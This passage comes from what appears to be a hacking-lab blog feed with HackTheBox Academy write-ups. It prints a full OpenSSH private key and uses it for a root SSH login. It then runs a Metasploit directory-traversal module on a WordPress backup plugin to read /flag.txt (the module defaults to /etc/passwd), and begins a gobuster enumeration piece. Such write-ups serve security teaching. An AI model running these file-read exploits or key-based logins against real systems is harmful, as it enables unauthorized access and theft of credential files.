+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">NhAAAAAwEAAQAAAYEAt3nX57B1Z2nSHY+aaj4lKt9lyeLVNiFh7X0vQisxoPv9BjNppQxV
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PtQ8csvHq/GatgSo8oVyskZIRbWb7QvCQI7JsT+Pr4ieQayNIoDm6+i9F1hXyMc0VsAqMk
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">05z9YKStLma0iN6l81Mr0dAI63x0mtwRKeHvJR+EiMtUTlAX9++kQJmD9F3lDSnLF4/dEy
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">G4WQSAH7F8Jz3OrRKLprBiDf27LSPgOJ6j8OLn4bsiacaWFBl3+CqkXeGkecEHg5dIL4K+
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">aPDP2xzFB0d0c7kZ8AtogtD3UYdiVKuF5fzOPJxJO1Mko7UsrhAh0T6mIBJWRljjUtHwSs
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ntrFfE5trYET5L+ov5WSi+tyBrAfCcg0vW1U78Ge/3h4zAG8KaGZProMUSlu3MbCfl1uK/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">EKQXxCNIyr7Gmci0pLi9k16A1vcJlxXYHBtJg6anLntwYVxbwYgYXp2Ghj+GwPcj2Ii4fq
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ynRFP1fsy6zoSjN9C977hCh5JStT6Kf0IdM68BcHAAAFiA2zO0oNsztKAAAAB3NzaC1yc2
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">EAAAGBALd51+ewdWdp0h2Pmmo+JSrfZcni1TYhYe19L0IrMaD7/QYzaaUMVT7UPHLLx6vx
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mrYEqPKFcrJGSEW1m+0LwkCOybE/j6+InkGsjSKA5uvovRdYV8jHNFbAKjJNOc/WCkrS5m
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tIjepfNTK9HQCOt8dJrcESnh7yUfhIjLVE5QF/fvpECZg/Rd5Q0pyxeP3RMhuFkEgB+xfC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">c9zq0Si6awYg39uy0j4Dieo/Di5+G7ImnGlhQZd/gqpF3hpHnBB4OXSC+Cvmjwz9scxQdH
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">dHO5GfALaILQ91GHYlSrheX8zjycSTtTJKO1LK4QIdE+piASVkZY41LR8ErJ7axXxOba2B
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">E+S/qL+VkovrcgawHwnINL1tVO/Bnv94eMwBvCmhmT66DFEpbtzGwn5dbivxCkF8QjSMq+
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">xpnItKS4vZNegNb3CZcV2BwbSYOmpy57cGFcW8GIGF6dhoY/hsD3I9iIuH6sp0RT9X7Mus
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">6EozfQve+4QoeSUrU+in9CHTOvAXBwAAAAMBAAEAAAGAMxEtv+YEd3kjq2ip4QJVE/7D9R
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">I2p+9Ys2JRgghFsvoQLeanc/Hf1DH8dTM06y2/EwRvBbmQ9//J4+Utdif8tD1J9BSt6HyN
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">F9hwG/dmzqij4NiM7mxLrA2mcQO/oJKBoNvcmGXEYkSHqQysAti2XDisrP2Clzh5CjMfPu
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DjIKyc6gl/5ilOSBeU11oqQ/MzECf3xaMPgUh1OTr+ZmikmzsRM7QtAme3vkQ4rUYabVaD
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2Gzidcle1AfITuY5kPf1BG2yFAd3EzddnZ6rvmZxsv2ng9u3Y4tKHNttPYBzoRwwOqlfx9
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PyqNkT0c3sV4BdhjH5/65w7MtkufqF8pvMFeCyywJgRL/v0/+nzY5VN5dcoaxkdlXai3DG
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">5/sVvliVLHh67UC7adYcjrN49g0S3yo1W6/x6n+GcgCH8wHKHDvh5h09jdmxDqY3A8jTit
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CeTUQKMlEp5ds0YKfzN1z4lj7NpCv003I7CQwSESjVtYPKia17WvOFwMZqK/B9zxoxAAAA
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wQC8vlpL0kDA/CJ/nIp1hxJoh34av/ZZ7nKymOrqJOi2Gws5uwmrOr8qlafg+nB+IqtuIZ
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pTErmbc2DHuoZp/kc58QrJe1sdPpXFGTcvMlk64LJ+dt9sWEToGI/VDF+Ps3ovmeyzwg64
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+XjUNQ6k9VLZqd2M5rhONefNxM+LKR4xjZWHyE+neWMSgELtROtonyekaPsjOEydSybFoD
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cSYlNtEk6EW92xZBojJB7+4RGKh3+YNwvocvUkHWDEKADBO7YAAADBAPRj/ZTM7ATSOl0k
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">TcHWJpTiaw8oSWKbAmvqAtiWarsM+NDlL6XHqeBL8QL+vczaJjtV94XQc/3ZBSao/Wf8E5
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">InrD4hdj1FOG6ErQZns6vG1A2VBOEl8qu1r5zKvq5A6vfSzSlmBkW7XjMLJ0GiomKw9+4n
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vPI0QJaLvUWnU/2rRm7mqFCCbaVl2PYgiO6qat9TxI2y7scsLlY8cjLjPp2ZobIZN5tu3Y
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">34b8afl+MxqFW3I5pjDrfi5zWkCypILwAAAMEAwDETdoE8mZK7wOeBFrmYjYmszaD9uCA/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">m4kLJg4kHm4zHCmKUVTEb9GpEZr1hnSSVb+qn61ezSgYn3yvClGcyddIht61i7MwBt6cgl
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ZGQvP/9j2jexpc1Sq0g+l7hKK/PmOrXRk4FFXk+j6l0m7z0TGXzVDiT+yCAnv6Rla/vd3e
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">7v0aCqLbhyFZBQ9WdyAMU/DKiZRM6knckt61TEL6ffzToNS+sQu0GSh6EYzdpUfevwKL+a
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">QfPM8OxSjcVJCpAAAAEXJvb3RANzZkOTFmZTVjMjcwAQ==
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----END OPENSSH PRIVATE KEY-----
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="solutionflag">Solution/Flag
+&lt;/h3>&lt;p>I copy the key to my local machine in a file named id_rsa and save it, then try to use it to log in as the root user using the commands:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">──(papab3ar㉿kali)-[~]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ ssh root@94.237.49.11 -p 31973 -i id_rsa
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Let me break this command down in bits:
+&lt;strong>ssh&lt;/strong>: This is the command used to start an SSH connection.&lt;/p>
+&lt;p>&lt;strong>&lt;a class="link" href="mailto:root@94.237.49.11" >root@94.237.49.11&lt;/a>&lt;/strong>: This specifies the username and IP address of the remote server. In this case, the username is &amp;ldquo;root,&amp;rdquo; and the IP address is &amp;ldquo;94.237.49.11.&amp;rdquo;&lt;/p>
+&lt;p>&lt;strong>-p 31973&lt;/strong>: This option specifies the port number to use for the SSH connection. The port number is set to &amp;ldquo;31973.&amp;rdquo;&lt;/p>
+&lt;p>&lt;strong>-i id_rsa&lt;/strong>: This option specifies the identity (private key) file to use for authentication. In this case, the private key file named &amp;ldquo;id_rsa&amp;rdquo; is being used for authentication.
+of-course we gain access to the machine as the root user as we get the welcome banner like we got during our initial access with the root user&amp;rsquo;s shell:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">root@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~#
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>So now we just list directories and read the contents of the &lt;em>flag.txt&lt;/em> file.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">ls
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat flag.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">HTB{pr1v1l363_**********_2_r007}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="conclusion">Conclusion
+&lt;/h3>&lt;p>In summary, this challenge underscores the significance of privilege escalation techniques for unearthing concealed data and vulnerabilities. By leveraging SSH keys, directory permissions, and sudo privileges, we elevate our access and seize the flag.&lt;/p>
+&lt;p>Remember, relentless learning and exploration are paramount to mastering hacking skills. Embrace the journey, and let the quest for knowledge fuel your hacking endeavors.&lt;/p>
+&lt;p>dr0idbot signing off.&lt;/p></description></item><item><title>Public Exploits</title><link>https://hushkat.github.io/p/public-exploits/</link><pubDate>Wed, 02 Aug 2023 00:00:00 +0000</pubDate><guid>https://hushkat.github.io/p/public-exploits/</guid><description>&lt;img src="https://hushkat.github.io/p/public-exploits/Metasploit.png" alt="Featured image of post Public Exploits" />&lt;h3 id="introduction">Introduction
+&lt;/h3>&lt;p>Welcome to yet another writeup where I cover an important tool used by hackers to exploit vulnerabilities on different systems: &lt;a class="link" href="https://www.metasploit.com/" target="_blank" rel="noopener"
+>Metasploit&lt;/a> In this challenge, part of the &amp;ldquo;Getting started&amp;rdquo; series on HackTheBox Academy, we will be delving into the realm of public exploits and uncovering the power of Metasploit.&lt;/p>
+&lt;p>&lt;em>Disclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.&lt;/em>&lt;/p>
+&lt;h3 id="public-exploits-challenge">Public exploits Challenge.
+&lt;/h3>&lt;p>The challenge instructions were simple: &amp;ldquo;Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the &amp;lsquo;/flag.txt&amp;rsquo; file.&amp;rdquo; The main focus of this challenge is to demonstrate the ability to identify vulnerabilities and effectively exploit them. Let&amp;rsquo;s begin our journey by examining the target IP address and visiting the associated webpage.
+&lt;img src="https://hushkat.github.io/p/public-exploits/PublicExploits.jpg"
+width="1015"
+height="252"
+srcset="https://hushkat.github.io/p/public-exploits/PublicExploits_hu17449750365477643856.jpg 480w, https://hushkat.github.io/p/public-exploits/PublicExploits_hu11126079795141998931.jpg 1024w"
+loading="lazy"
+alt="chall desc"
+class="gallery-image"
+data-flex-grow="402"
+data-flex-basis="966px"
+>&lt;/p>
+&lt;h3 id="observations--findings">Observations &amp;amp; Findings
+&lt;/h3>&lt;p>Upon accessing the webpage, the very first thing that caught our attention was a version number and a brief description of a WordPress service. Drawing from our knowledge of how to find and exploit publicly available vulnerabilities, we swiftly launched the Metasploit console to search for an exploit relevant to this specific version.
+&lt;img src="https://hushkat.github.io/p/public-exploits/PublicExploits0.jpg"
+width="1918"
+height="800"
+srcset="https://hushkat.github.io/p/public-exploits/PublicExploits0_hu16881979783332079574.jpg 480w, https://hushkat.github.io/p/public-exploits/PublicExploits0_hu14133496900036993840.jpg 1024w"
+loading="lazy"
+alt="chall blog"
+class="gallery-image"
+data-flex-grow="239"
+data-flex-basis="575px"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">──(dr0idbot㉿kali)-[~]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$msfconsole
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- - - - - SNIP - - - - -
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf6 &amp;gt; search exploit wordpress 2.7.10
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Matching Modules
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">================
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> # Name Disclosure Date Rank Check Description
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - ---- --------------- ---- ----- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 0 auxiliary/scanner/http/wp_simple_backup_file_read normal No WordPress Simple Backup File Read Vulnerability
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/wp_simple_backup_file_read
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf6 &amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Metasploit came back with results, indicating that there is a publicly available exploit matching the version we found on the website.&lt;/p>
+&lt;p>Notice the command used to spin up metasploit &lt;strong>msfconsole&lt;/strong> after its up and running, we run the command &lt;strong>search exploit wordpress 2.7.10&lt;/strong> to see if there are any publicly available exploits for this plugin version. Sure enough, metasploit brings back results and slight description of what we are looking for matching the info on the website we had visited earlier on.&lt;/p>
+&lt;p>We have an option to see information about that exploit before using it, to see what they payload does. For that we use the command &lt;strong>info&lt;/strong> plus the index of the exploit itself.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">msf6 &amp;gt; info 0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Basic options:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Name Current Setting Required Description
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ---- --------------- -------- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DEPTH 6 yes Traversal Depth (to reach the root fold
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> er)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> FILEPATH /etc/passwd yes The path to the file to read
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Proxies no A proxy chain of format type:host:port[
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ,type:host:port][...]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RHOSTS yes The target host(s), see https://docs.me
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> tasploit.com/docs/using-metasploit/basi
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> cs/using-metasploit.html
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RPORT 80 yes The target port (TCP)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> SSL false no Negotiate SSL/TLS for outgoing connecti
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ons
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> TARGETURI / yes The base path to the wordpress applicat
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ion
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> THREADS 1 yes The number of concurrent threads (max o
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ne per host)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> VHOST no HTTP server virtual host
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Description:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> This module exploits a directory traversal vulnerability in WordPress Plugin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#34;Simple Backup&amp;#34; version 2.7.10, allowing to read arbitrary files with the
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> web server privileges.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- - - - - SNIP - - - - -
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>As you can see, a bunch of information is given about this particular exploit with a number options that we need to set in order for the payload to work on our target. Next we use the command &lt;strong>use&lt;/strong> plus the index of the exploit we have picked for the exploitation. After selection we set the options that are required by metasploit before executing the payload.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">msf6 &amp;gt; use 0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf6 auxiliary(scanner/http/wp_simple_backup_file_read) &amp;gt; set FILEPATH /flag.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf6 auxiliary(scanner/http/wp_simple_backup_file_read) &amp;gt; set RHOSTS 94.237.49.11
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf6 auxiliary(scanner/http/wp_simple_backup_file_read) &amp;gt; set RPORT 41884
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>After obtaining information about the exploit, including the required options, we set the necessary values to ensure the payload will work against our target.
+With all the options set, we verified the details and executed the payload on the target.&lt;/p>
+&lt;h3 id="solutionflag">Solution/Flag
+&lt;/h3>&lt;p>Upon successful execution of the payload, the Metasploit console provided us with the following output:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">[+] File saved in: /home/papab3ar/.msf4/loot/20230803014901_default_94.237.49.11_simplebackup.tra_422018.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] Scanned 1 of 1 hosts (100% complete)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] Auxiliary module execution completed
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Using the command &lt;strong>cat&lt;/strong>, we accessed the directory where the file was saved and retrieved the contents of the flag, thus completing the challenge.
+&lt;img src="https://hushkat.github.io/p/public-exploits/PublicExploits1.jpg"
+width="664"
+height="134"
+srcset="https://hushkat.github.io/p/public-exploits/PublicExploits1_hu129630161148891722.jpg 480w, https://hushkat.github.io/p/public-exploits/PublicExploits1_hu12755825758852016865.jpg 1024w"
+loading="lazy"
+alt="chall blog"
+class="gallery-image"
+data-flex-grow="495"
+data-flex-basis="1189px"
+>&lt;/p>
+&lt;h3 id="conclusion">Conclusion
+&lt;/h3>&lt;p>Metasploit proved to be a powerful tool during this challenge, allowing us to search for and exploit publicly available vulnerabilities effortlessly. It demonstrates the significance of staying vigilant against potential threats and the importance of secure coding practices for developers.&lt;/p>
+&lt;p>For a deeper understanding of Metasploit and its capabilities, you can refer to its official documentation &lt;a class="link" href="https://docs.metasploit.com/" target="_blank" rel="noopener"
+>here&lt;/a>&lt;/p>
+&lt;p>In conclusion, this challenge provided an excellent opportunity to apply web enumeration techniques, uncover hidden information, and identify potential vulnerabilities. As ethical hackers, the quest for knowledge and continuous learning is paramount. Happy hacking, and never stop learning!&lt;/p>
+&lt;p>dr0idbot out.&lt;/p></description></item><item><title>Web Enumeration</title><link>https://hushkat.github.io/p/web-enumeration/</link><pubDate>Sat, 29 Jul 2023 00:00:00 +0000</pubDate><guid>https://hushkat.github.io/p/web-enumeration/</guid><description>&lt;img src="https://hushkat.github.io/p/web-enumeration/Web.jpg" alt="Featured image of post Web Enumeration" />&lt;h3 id="introduction">Introduction
+&lt;/h3>&lt;p>Hello friend :) I know it has been a while but, welcome to another writeup from a challenge discovered at one of the best learning platforms for hackers &lt;a class="link" href="https://academy.hackthebox.com/" target="_blank" rel="noopener"
+>HackTheBox&lt;/a>. This challenge is part of the &lt;strong>Getting Started&lt;/strong> module and can be found &lt;a class="link" href="https://academy.hackthebox.com/course/preview/getting-started" target="_blank" rel="noopener"
+>here&lt;/a>. It is an excellent starting point for those interested in offensive security or red teaming.&lt;/p>
+&lt;p>&lt;em>Disclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.&lt;/em>&lt;/p>
+&lt;h3 id="web-enumeration-challenge">Web Enumeration Challenge.
+&lt;/h3>&lt;p>&lt;img src="https://hushkat.github.io/p/web-enumeration/WebEnumeration.jpg"
+width="1018"
+height="261"
+srcset="https://hushkat.github.io/p/web-enumeration/WebEnumeration_hu8515057553585735834.jpg 480w, https://hushkat.github.io/p/web-enumeration/WebEnumeration_hu11465272349736749952.jpg 1024w"
+loading="lazy"
+alt="chall desc"
+class="gallery-image"
+data-flex-grow="390"
+data-flex-basis="936px"
+>
+The challenge instructions were straightforward: &amp;ldquo;Try running some of the web enumeration techniques you learned in this section on the server above, and use the info you get to get the flag.&amp;rdquo; The focus of the challenge was to apply web enumeration techniques to assess the security of websites. By copying the target IP address and visiting the associated webpage, We are greeted with some welcome text to the &amp;ldquo;HTB blog page&amp;rdquo;.
+&lt;img src="https://hushkat.github.io/p/web-enumeration/WebEnumeration0.jpg"
+width="1920"
+height="878"
+srcset="https://hushkat.github.io/p/web-enumeration/WebEnumeration0_hu16122848629764167035.jpg 480w, https://hushkat.github.io/p/web-enumeration/WebEnumeration0_hu8267798658238640275.jpg 1024w"
+loading="lazy"
+alt="chall blog"
+class="gallery-image"
+data-flex-grow="218"
+data-flex-basis="524px"
+>&lt;/p>
+&lt;h3 id="observations--findings">Observations &amp;amp; Findings
+&lt;/h3>&lt;p>Upon first inspection, there wasn&amp;rsquo;t much information visible on the webpage. My next step was to inspect the page&amp;rsquo;s underlying code, which is often a good starting point for such challenges. Unfortunately, even after inspecting the code, I didn&amp;rsquo;t find anything substantial. So, I decided to leverage the tool &lt;a class="link" href="https://www.kali.org/tools/gobuster/" target="_blank" rel="noopener"
+>gobuster&lt;/a> to perform a brute-force attack on the website and find other directories.&lt;/p>
+&lt;p>&lt;img src="https://hushkat.github.io/p/web-enumeration/WebEnumeration1.jpg"
+width="1920"
+height="516"
+srcset="https://hushkat.github.io/p/web-enumeration/WebEnumeration1_hu15035713072342324124.jpg 480w, https://hushkat.github.io/p/web-enumeration/WebEnumeration1_hu3462159937791897608.jpg 1024w"
+loading="lazy"
+alt="Gobuster bruteforce"
+class="gallery-image"
+data-flex-grow="372"
+data-flex-basis="893px"
+>&lt;/p>
+&lt;p>This approach paid off as I discovered a directory. Navigating this directory revealed a page that appeared to be under construction, possibly an incomplete WordPress site.
+&lt;img src="https://hushkat.github.io/p/web-enumeration/WebEnumeration2.jpg"
+width="1920"
+height="878"
+srcset="https://hushkat.github.io/p/web-enumeration/WebEnumeration2_hu2192201098653058149.jpg 480w, https://hushkat.github.io/p/web-enumeration/WebEnumeration2_hu16459381043555446653.jpg 1024w"
+loading="lazy"
+alt="Wordpress"
+class="gallery-image"
+data-flex-grow="218"
+data-flex-basis="524px"
+>&lt;/p>
+&lt;p>Once again, I decided to inspect the page&amp;rsquo;s code, hoping to find something useful. This time, I stumbled upon a section related to web crawlers. Web crawlers, also known as spiders or spiderbots, systematically browse the World Wide Web on behalf of search engines for indexing purposes. Websites often use a file called robots.txt to instruct or block these crawlers from accessing certain web directories.
+&lt;img src="https://hushkat.github.io/p/web-enumeration/WebEnumeration3.jpg"
+width="1920"
+height="500"
+srcset="https://hushkat.github.io/p/web-enumeration/WebEnumeration3_hu8448233419615401878.jpg 480w, https://hushkat.github.io/p/web-enumeration/WebEnumeration3_hu953760390495453459.jpg 1024w"
+loading="lazy"
+alt="wordpress inspection"
+class="gallery-image"
+data-flex-grow="384"
+data-flex-basis="921px"
+>&lt;/p>
+&lt;p>Armed with this knowledge, I attempted to access the robots.txt file to view its contents.
+&lt;img src="https://hushkat.github.io/p/web-enumeration/WebEnumeration4.jpg"
+width="1920"
+height="300"
+srcset="https://hushkat.github.io/p/web-enumeration/WebEnumeration4_hu6422896200408462688.jpg 480w, https://hushkat.github.io/p/web-enumeration/WebEnumeration4_hu3405148104871446228.jpg 1024w"
+loading="lazy"
+alt="robots.txt"
+class="gallery-image"
